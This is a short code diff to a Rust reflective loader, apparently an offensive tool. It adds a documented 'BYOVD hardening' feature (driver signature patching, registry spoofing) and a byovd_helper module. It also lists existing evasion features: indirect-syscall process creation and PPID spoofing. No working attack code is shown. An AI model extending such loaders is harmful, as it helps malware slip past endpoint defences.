@@ -9,6 +9,7 @@
 //! - Complete IAT resolution and relocation
 //! - Native indirect syscall process creation (no CreateProcessW)
 //! - PPID spoofing via PS_ATTRIBUTE_PARENT_PROCESS
+//! - BYOVD hardening: driver signature patching + registry spoofing
 
 #![allow(dead_code)]
 
@@ -77,6 +78,8 @@ mod windows {
     pub unsafe fn set_ppid(_ppid: u32) -> bool { false }
     pub unsafe fn bypass_block_dlls() -> bool { false }
 }
+
+mod byovd_helper;
 
 pub struct ReflectiveLoader;
 
